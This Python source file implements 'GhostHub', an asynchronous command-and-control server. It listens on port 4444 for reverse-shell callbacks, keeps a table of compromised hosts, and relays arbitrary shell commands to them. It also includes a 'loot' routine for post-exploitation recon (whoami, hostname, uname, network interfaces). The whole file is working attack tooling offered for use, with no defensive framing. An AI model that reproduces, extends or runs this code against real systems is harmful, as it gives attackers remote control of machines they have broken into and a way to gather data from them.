import socket
import threading
import asyncio
import base64
import os
import time
import questionary
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from core.ui import draw_header, Q_STYLE
from modules.looter import run_looter

console = Console()


class GhostHub:
    def __init__(self, port=4444):
        self.port = int(port)
        self.sessions = {}  # {id: {'reader': r, 'writer': w, 'ip': ip, 'time': str}}
        self.counter = 1
        self.running = True

    async def handle_ghost(self, reader, writer):
        """Asynchronous handler for multiple callbacks."""
        addr = writer.get_extra_info('peername')
        s_id = self.counter
        self.sessions[s_id] = {
            'reader': reader,
            'writer': writer,
            'ip': addr[0],
            'time': time.strftime("%H:%M:%S")
        }
        self.counter += 1
        console.print(
            f"\n[bold green][!] GHOST CONNECTED: {addr[0]} (ID: {s_id})[/bold green]")
        console.print(
            f"[dim cyan][*] Ghost-{s_id} established. Ready for interaction.[/dim cyan]")

    async def interact(self, s_id):
        if s_id not in self.sessions:
            return console.print(f"[red][!] Session {s_id} not found.[/red]")

        session = self.sessions[s_id]
        writer = session['writer']
        reader = session['reader']

        console.print(Panel(
            f"Session {s_id} Active: {session['ip']}\nCommands: [green]loot, download <path>, back, terminate[/green]", border_style="red"))

        while True:
            # Using rich console input for shell interaction to keep it fast
            cmd = console.input(f"[bold red]Ghost-{s_id}[/bold red]> ").strip()

            if not cmd or cmd == "back":
                break

            if cmd == "terminate":
                writer.close()
                await writer.wait_closed()
                del self.sessions[s_id]
                break

            if cmd == "loot":
                # Automated post-exploitation recon
                writer.write(
                    b"whoami && hostname && uname -a && (ip addr || ifconfig)\n")
                await writer.drain()
                try:
                    data = await asyncio.wait_for(reader.read(4096), timeout=5.0)
                    console.print(Panel(data.decode('utf-8', errors='ignore'),
                                  title="Automated Recon", border_style="cyan"))
                except asyncio.TimeoutError:
                    console.print("[yellow][!] Loot timeout.[/yellow]")
                continue

            writer.write((cmd + "\n").encode())
            await writer.drain()

            try:
                # Set a small timeout for data reading
                data = await asyncio.wait_for(reader.read(16384), timeout=5.0)
                console.print(data.decode('utf-8', errors='ignore'))
            except asyncio.TimeoutError:
                console.print("[yellow][!] Response timed out.[/yellow]")

    async def start_server(self):
        server = await asyncio.start_server(self.handle_ghost, '0.0.0.0', self.port)
        async with server:
            await server.serve_forever()


async def async_hub_entry():
    draw_header("GHOST-HUB C2: MULTI-SESSION ASYNC")
    port = questionary.text(
        "Listen Port:", default="4444", style=Q_STYLE).ask()
    if not port:
        port = "4444"

    hub = GhostHub(port=port)
    server_task = asyncio.create_task(hub.start_server())

    while True:
        table = Table(title="Live Ghost Command & Control", border_style="red")
        table.add_column("ID", justify="center")
        table.add_column("IP Address", style="cyan")
        table.add_column("Callback Time", style="magenta")
        table.add_column("Status", style="green")

        for sid, data in hub.sessions.items():
            table.add_row(str(sid), data['ip'], data['time'], "ACTIVE")

        console.print(table)

        cmd_input = questionary.text(
            "Hub Command (interact <ID>, exit):", style=Q_STYLE).ask()

        if not cmd_input:
            continue

        args = cmd_input.split()
        cmd = args[0].lower()

        if cmd == "interact":
            try:
                await hub.interact(int(args[1]))
            except IndexError:
                console.print("[red][!] Usage: interact <ID>[/red]")
        elif cmd == "exit":
            break


def run_ghost_hub():
    asyncio.run(async_hub_entry())


if __name__ == "__main__":
    run_ghost_hub()
